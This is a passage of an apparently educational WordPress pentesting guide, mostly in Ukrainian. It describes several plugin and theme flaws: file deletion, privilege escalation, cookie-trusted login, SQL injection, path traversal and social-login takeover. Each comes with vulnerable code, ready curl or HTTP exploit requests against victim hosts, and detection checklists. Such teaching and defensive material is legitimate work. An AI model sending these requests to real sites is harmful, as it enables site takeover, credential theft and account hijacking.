* **No nonce / capability check** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ endpoint.
* **–ù–µ–º–∞—î —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó —à–ª—è—Ö—É** ‚Äì —Ä—è–¥–æ–∫, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, `fontfamily`, –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –∑—ñ —à–ª—è—Ö–æ–º —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∫–ª–∞—Å–∏—á–Ω–∏–π `../../` traversal.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ê—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É uploads** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`) –≤—ñ–¥–ø—Ä–∞–≤–∏–≤—à–∏ –æ–¥–∏–Ω HTTP POST –∑–∞–ø–∏—Ç:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

–Ü–Ω—à–∏–º–∏ –∑–Ω–∞—á—É—â–∏–º–∏ —Ü—ñ–ª—è–º–∏ —î `.php` —Ñ–∞–π–ª–∏ –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º (—â–æ–± –∑–ª–∞–º–∞—Ç–∏ security plugins) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### Detection checklist

* –ë—É–¥—å-—è–∫–∏–π `add_action( 'wp_ajax_nopriv_...')` –∑–≤–æ—Ä–æ—Ç–Ω–∏–π –≤–∏–∫–ª–∏–∫ (callback), —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î —Ñ–∞–π–ª–æ–≤—ñ —Ö–µ–ª–ø–µ—Ä–∏ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ–æ—á–∏—â–µ–Ω–∏—Ö –≤–≤–µ–¥–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (‚â§ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –î–æ–≤—ñ—Ä—è—î `$_REQUEST['reset-for']` —Ç–∞ –æ–ø—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.
- –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–∞–Ω—ñ—à–µ –º–∞–≤ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ `_asenha_view_admin_as_original_roles`, —ñ –π–æ–≥–æ –∑–Ω–∏–∑–∏–ª–∏ –≤ –ø—Ä–∞–≤–∞—Ö, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ —à–ª—è—Ö—É —Å–∫–∏–¥–∞–Ω–Ω—è.
- –£ –¥–µ—è–∫–∏—Ö —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è—Ö –±—É–¥—å-—è–∫–∏–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–µ –≤—Å–µ —â–µ –ø—Ä–∏—Å—É—Ç–Ω—î –≤ `viewing_admin_as_role_are` (–Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó).

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–ø—Ä–∏–∫–ª–∞–¥)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
–ù–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∑–±—ñ—Ä–∫–∞—Ö —Ü–µ –≤–∏–¥–∞–ª—è—î –ø–æ—Ç–æ—á–Ω—ñ —Ä–æ–ª—ñ —ñ –ø–æ–≤—Ç–æ—Ä–Ω–æ –¥–æ–¥–∞—î –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `administrator`), —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

Detection checklist

- –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è —Ä–æ–ª–µ–π, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å ‚Äúoriginal roles‚Äù –≤ user meta (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `_asenha_view_admin_as_original_roles`).
- –í–∏–∑–Ω–∞—á–∞–π—Ç–µ —à–ª—è—Ö–∏ —Å–∫–∏–¥–∞–Ω–Ω—è/–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è, —è–∫—ñ:
- –ß–∏—Ç–∞—é—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ `$_REQUEST` / `$_GET` / `$_POST`.
- –ú–æ–¥–∏—Ñ—ñ–∫—É—é—Ç—å —Ä–æ–ª—ñ —á–µ—Ä–µ–∑ `add_role()` / `remove_role()` –±–µ–∑ `current_user_can()` —Ç–∞ `wp_verify_nonce()` / `check_admin_referer()`.
- –ê–≤—Ç–æ—Ä–∏–∑—É—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º–∞—Å–∏–≤—É –æ–ø—Ü—ñ–π –ø–ª–∞–≥—ñ–Ω–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `viewing_admin_as_role_are`) –∑–∞–º—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capabilities –∞–∫—Ç–æ—Ä–∞.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –ø—ñ–¥–∫–ª—é—á–∞—é—Ç—å –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ `init` —Ö—É–∫–∞ —ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —ñ–∑ cookie, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–æ–º. –Ø–∫—â–æ –∫–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î `wp_set_auth_cookie()` –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, capability —Ç–∞ –¥—ñ–π—Å–Ω–æ–≥–æ nonce, –±—É–¥—å-—è–∫–∏–π –Ω–µ–≤–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –ø—Ä–∏–º—É—Å–æ–≤–æ –∑–∞–ª–æ–≥—ñ–Ω–∏—Ç–∏—Å—è —è–∫ –¥–æ–≤—ñ–ª—å–Ω–∏–π ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

–¢–∏–ø–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–∞—Ç–µ—Ä–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ –∑ Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –ü—É–±–ª—ñ—á–Ω–∏–π —Ö—É–∫ `init` —Ä–æ–±–∏—Ç—å –æ–±—Ä–æ–±–Ω–∏–∫ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è unauthenticated –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–µ–º–∞—î –∑–∞—Ö–∏—Å—Ç—É `is_user_logged_in()`).
- –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è cookie, —è–∫—É –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞ –±–æ—Ü—ñ –∫–ª—ñ—î–Ω—Ç–∞ (`original_user_id`).
- –ü—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫ `wp_set_auth_cookie($uid)` –∞–≤—Ç–æ—Ä–∏–∑—É—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ –∂–æ–¥–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability/nonce.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### –ó–∞—É–≤–∞–≥–∏ —â–æ–¥–æ WAF –¥–ª—è WordPress/plugin CVEs

–ó–∞–≥–∞–ª—å–Ω—ñ edge/server WAFs –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ —à–∏—Ä–æ–∫—ñ —à–∞–±–ª–æ–Ω–∏ (SQLi, XSS, LFI). –ë–∞–≥–∞—Ç–æ –≤–∏—Å–æ–∫–æ–≤–ø–ª–∏–≤–æ–≤–∏—Ö WordPress/plugin –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π ‚Äî —Ü–µ –ø–æ–º–∏–ª–∫–∏ –ª–æ–≥—ñ–∫–∏/auth —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –¥–æ–¥–∞—Ç–∫–∞, —è–∫—ñ –≤–∏–≥–ª—è–¥–∞—é—Ç—å —è–∫ –Ω–µ—à–∫—ñ–¥–ª–∏–≤–∏–π —Ç—Ä–∞—Ñ—ñ–∫, —è–∫—â–æ –¥–≤–∏–∂–æ–∫ –Ω–µ —Ä–æ–∑—É–º—ñ—î –º–∞—Ä—à—Ä—É—Ç–∏ WordPress —ñ —Å–µ–º–∞–Ω—Ç–∏–∫—É –ø–ª–∞–≥—ñ–Ω–∞.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- –¢–∏–ø–æ–≤—ñ –≤–∏—Å–æ–∫–æ–≤–ø–ª–∏–≤–æ–≤—ñ –≤–∏–ø–∞–¥–∫–∏: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- –ù–µ –ø–æ–∫–ª–∞–¥–∞–π—Ç–µ—Å—è –Ω–∞ generic WAF signatures –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É plugin CVEs. –í–ø—Ä–æ–≤–∞–¥–∂—É–π—Ç–µ application-layer, vulnerability-specific virtual patches –∞–±–æ —à–≤–∏–¥–∫–æ –æ–Ω–æ–≤–ª—é–π—Ç–µ.
- –ù–∞–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É positive-security –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞–º —É –∫–æ–¥—ñ (capabilities, nonces, strict input validation) –Ω–∞–¥ negative regex —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏.

## –ó–∞—Ö–∏—Å—Ç WordPress

### Regular Updates

–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ WordPress, plugins —ñ themes –æ–Ω–æ–≤–ª–µ–Ω—ñ. –¢–∞–∫–æ–∂ –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å, —â–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —É–≤—ñ–º–∫–Ω–µ–Ω–æ –≤ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–¢–∞–∫–æ–∂ **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ WordPress**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ **–ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ** **–ø—Ä–∞–≤–∞** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- **–û–±–º–µ–∂—Ç–µ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–ø—Ä–æ–± –≤—Ö–æ–¥—É**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ Brute Force-–∞—Ç–∞–∫–∞–º
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —Ç–∞ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.

### –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π SQL Injection —á–µ—Ä–µ–∑ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—é –≤–∞–ª—ñ–¥–∞—Ü—ñ—é (WP Job Portal <= 2.3.2)

–ü–ª–∞–≥—ñ–Ω WP Job Portal —Ä–µ–∫—Ä—É—Ç–∏–Ω–≥—É –Ω–∞–¥–∞–≤ –¥–æ—Å—Ç—É–ø –¥–æ –∑–∞–≤–¥–∞–Ω–Ω—è **savecategory**, —è–∫–µ –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É –≤–∏–∫–æ–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–∏–∫–ª–∏–∫–∞–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

1. **Unsanitised user input** ‚Äì `parentid` –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTTP-–∑–∞–ø–∏—Ç—É.
2. **String concatenation inside the WHERE clause** ‚Äì –≤—ñ–¥—Å—É—Ç–Ω—ñ `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì —Ö–æ—á–∞ –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `admin-post.php`, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ ‚Äî **CSRF nonce** (`wp_verify_nonce()`), —è–∫–∏–π –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –º—ñ—Å—Ç–∏—Ç—å —à–æ—Ä—Ç–∫–æ–¥ `[wpjobportal_my_resumes]`.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–≤—ñ–∂–∏–π nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. –í–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π SQL, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ñ–Ω–∂–µ–∫—Ç–æ–≤–∞–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∞–±–æ –∑–º—ñ–Ω—é—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

–Ü–Ω—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è, **downloadcustomfile**, –¥–æ–∑–≤–æ–ª—è–ª–æ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ **any file on disk** —á–µ—Ä–µ–∑ path traversal. –£—Ä–∞–∑–ª–∏–≤–∏–π sink –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∞—Ç–∞–∫—É—é—á–∏–º —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è **without sanitisation**. –ó–Ω–æ–≤—É –∂, —î–¥–∏–Ω–∏–π –±–∞—Ä'—î—Ä ‚Äî **CSRF nonce**, —è–∫–∏–π –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —Ä–µ–∑—é–º–µ.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
–°–µ—Ä–≤–µ—Ä –ø–æ–≤–µ—Ä—Ç–∞—î –≤–º—ñ—Å—Ç `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

–ë–∞–≥–∞—Ç–æ —Ç–µ–º/–ø–ª–∞–≥—ñ–Ω—ñ–≤ –≤–∫–ª—é—á–∞—é—Ç—å –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏ "social login", –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ admin-ajax.php. –Ø–∫—â–æ –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ AJAX –¥—ñ—è (wp_ajax_nopriv_...) –¥–æ–≤—ñ—Ä—è—î —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞–º, –Ω–∞–¥–∞–Ω–∏–º –∫–ª—ñ—î–Ω—Ç–æ–º, –∫–æ–ª–∏ –¥–∞–Ω—ñ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ, —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—î wp_set_auth_cookie(), —Ü–µ —Å—Ç–∞—î –ø–æ–≤–Ω–∏–º –æ–±—Ö–æ–¥–æ–º –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

–¢–∏–ø–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–∞—Ç–µ—Ä–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
–ß–æ–º—É —Ü–µ –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç—å—Å—è

- –ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –¥–æ—Å—Ç—É–ø—É –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- –í—ñ–¥—Å—É—Ç–Ω—ñ nonce/capability checks –ø–µ—Ä–µ–¥ –∑–º—ñ–Ω–æ—é —Å—Ç–∞–Ω—É.
- –í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ OAuth/OpenID; –≥—ñ–ª–∫–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—Ä–∏–π–º–∞—î –≤–≤–µ–¥–µ–Ω–Ω—è –≤—ñ–¥ –Ω–∞–ø–∞–¥–Ω–∏–∫–∞.
- get_user_by('email', $_POST['id']) –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º –≤–∏–∫–ª–∏–∫–æ–º wp_set_auth_cookie($uid) –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ –±—É–¥—å-—è–∫—É —ñ—Å–Ω—É—é—á—É email-–∞–¥—Ä–µ—Å—É.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (unauthenticated)

- –ü–µ—Ä–µ–¥—É–º–æ–≤–∏: attacker –º–æ–∂–µ –¥—ñ—Å—Ç–∞—Ç–∏—Å—è –¥–æ /wp-admin/admin-ajax.php —ñ –∑–Ω–∞—î/–≤–≥–∞–¥—É—î –¥—ñ–π—Å–Ω—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- Set provider to an unsupported value (or omit it) to hit the default branch and pass id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
